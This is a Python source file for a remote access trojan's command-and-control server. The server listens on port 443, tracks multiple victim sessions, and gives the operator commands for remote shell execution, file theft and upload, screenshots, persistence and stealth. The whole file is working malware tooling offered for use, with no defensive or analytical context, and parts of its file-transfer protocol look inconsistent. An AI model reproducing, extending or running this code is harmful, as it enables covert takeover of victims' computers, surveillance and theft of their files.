import socket
import threading
import cmd
import json
import zlib
import hashlib
import os
from time import sleep
from pathlib import Path


class RatC2(cmd.Cmd):
    prompt = 'RAT> '

    def __init__(self, host, port):
        super().__init__()
        self.sessions = {}
        self.current_session = None
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.bind((host, port))
        self.listener.listen(5)
        self.running = True

        threading.Thread(target=self.accept_connections, daemon=True).start()
        threading.Thread(target=self.heartbeat_check, daemon=True).start()

    def accept_connections(self):
        """Handle multiple incoming victim connections"""
        while self.running:
            try:
                client, addr = self.listener.accept()
                session_id = client.recv(1024).decode()  # Receive initial handshake
                self.sessions[session_id] = {
                    'socket': client,
                    'address': addr,
                    'info': None
                }
                print(f"\n[+] New connection from {addr[0]} (ID: {session_id})")
                self.get_session_info(session_id)
            except Exception as e:
                if self.running: print(f"Connection error: {str(e)}")

    def get_session_info(self, session_id):
        """Get system information from new session"""
        try:
            client = self.sessions[session_id]['socket']
            data = self._receive_data(client)
            self.sessions[session_id]['info'] = json.loads(data.decode())
            print(f"[*] Registered session {session_id}")
        except Exception as e:
            print(f"Session setup failed: {str(e)}")

    def do_sessions(self, arg):
        """List all active sessions"""
        print("\nActive Sessions:")
        for sid, session in self.sessions.items():
            info = session['info'] or {}
            print(f" {sid[:6]} | {info.get('os', 'Unknown')} | {info.get('hostname', 'Unknown')}")

    def do_switch(self, arg):
        """Switch active session: switch <session_id>"""
        if arg in self.sessions:
            self.current_session = arg
            info = self.sessions[arg]['info']
            self.prompt = f"RAT ({info['hostname']})> "
            print(f"Switched to session {arg[:6]}")
        else:
            print("Invalid session ID")

    def do_shell(self, arg):
        """Execute command on victim: shell <command>"""
        if not self._check_session(): return
        self._send_command(f'shell {arg}')
        response = self._receive_data()
        print(response.decode())

    def do_download(self, arg):
        """Download file from victim: download <remote_path>"""
        if not self._check_session(): return
        self._send_command(f'download {arg}')
        self._receive_file(arg)

    def do_upload(self, arg):
        """Upload file to victim: upload <local_path> <remote_path>"""
        if not self._check_session(): return
        try:
            local, remote = arg.split()
            self._send_command(f'upload {remote}')
            self._send_file(local)
        except ValueError:
            print("Usage: upload <local_path> <remote_path>")

    def do_screenshot(self, arg):
        """Take and download screenshot: screenshot [filename]"""
        if not self._check_session(): return
        filename = arg or f"screenshot_{self.current_session[:4]}.jpg"
        self._send_command('screenshot')
        self._receive_file(filename)

    def do_persist(self, arg):
        """Install persistence mechanism: persist [method]"""
        if not self._check_session(): return
        self._send_command(f'persist {arg}')
        print(self._receive_data().decode())

    def do_stealth(self, arg):
        """Toggle stealth mode: stealth [on/off]"""
        if not self._check_session(): return
        self._send_command(f'stealth {arg}')
        print(self._receive_data().decode())

    def do_kill(self, arg):
        """Remove RAT from victim: kill"""
        if not self._check_session(): return
        self._send_command('kill')
        del self.sessions[self.current_session]
        self.current_session = None
        print("Session terminated")

    def _send_command(self, cmd):
        """Send command with protocol framing"""
        client = self.sessions[self.current_session]['socket']
        data = cmd.encode()
        client.sendall(len(data).to_bytes(4, 'big') + data)

    def _receive_data(self, client=None):
        """Receive data with protocol framing"""
        client = client or self.sessions[self.current_session]['socket']
        size = int.from_bytes(client.recv(4), 'big')
        received = b''
        while len(received) < size:
            chunk = client.recv(min(4096, size - len(received)))
            if not chunk: break
            received += chunk
        return received

    def _send_file(self, local_path):
        """Enhanced file upload with verification"""
        client = self.sessions[self.current_session]['socket']
        try:
            # Send metadata
            file_hash = self._calculate_hash(local_path)
            metadata = json.dumps({
                'name': os.path.basename(local_path),
                'size': os.path.getsize(local_path),
                'hash': file_hash
            }).encode()
            client.sendall(metadata)

            # Wait for ACK
            if client.recv(3) != b'ACK':
                raise Exception("No ACK received")

            # Send compressed file
            with open(local_path, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk: break
                    compressed = zlib.compress(chunk)
                    client.sendall(compressed)

            # Verify transfer
            client.sendall(b'VER')
            response = client.recv(64).decode()
            if response != file_hash:
                raise Exception("Hash mismatch")
            print(f"File {local_path} uploaded successfully")

        except Exception as e:
            print(f"Upload failed: {str(e)}")

    def _receive_file(self, filename):
        """Enhanced file download with validation"""
        client = self.sessions[self.current_session]['socket']
        try:
            # Receive metadata
            metadata = json.loads(self._receive_data().decode())
            client.sendall(b'ACK')

            # Receive compressed data
            received = 0
            file_hash = hashlib.sha256()
            with open(filename, 'wb') as f:
                while received < metadata['size']:
                    chunk = zlib.decompress(self._receive_data(client))
                    f.write(chunk)
                    file_hash.update(chunk)
                    received += len(chunk)

            # Verify hash
            if file_hash.hexdigest() != metadata['hash']:
                os.remove(filename)
                raise Exception("File corrupted")
            print(f"File {filename} downloaded ({metadata['size']} bytes)")

        except Exception as e:
            print(f"Download failed: {str(e)}")

    def _calculate_hash(self, path):
        """Calculate SHA-256 hash of file"""
        sha = hashlib.sha256()
        with open(path, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk: break
                sha.update(chunk)
        return sha.hexdigest()

    def heartbeat_check(self):
        """Maintain active connections"""
        while self.running:
            for sid in list(self.sessions.keys()):
                try:
                    self.sessions[sid]['socket'].sendall(b'<HEARTBEAT>')
                except:
                    del self.sessions[sid]
                    if sid == self.current_session:
                        self.current_session = None
            sleep(30)

    def _check_session(self):
        if not self.current_session:
            print("No active session selected")
            return False
        return True

    def do_exit(self, arg):
        """Exit C2 server"""
        self.running = False
        for sid in list(self.sessions.keys()):
            self.sessions[sid]['socket'].close()
        self.listener.close()
        return True


if __name__ == '__main__':
    print("Starting Enhanced RAT C2 Server...")
    RatC2('0.0.0.0', 443).cmdloop()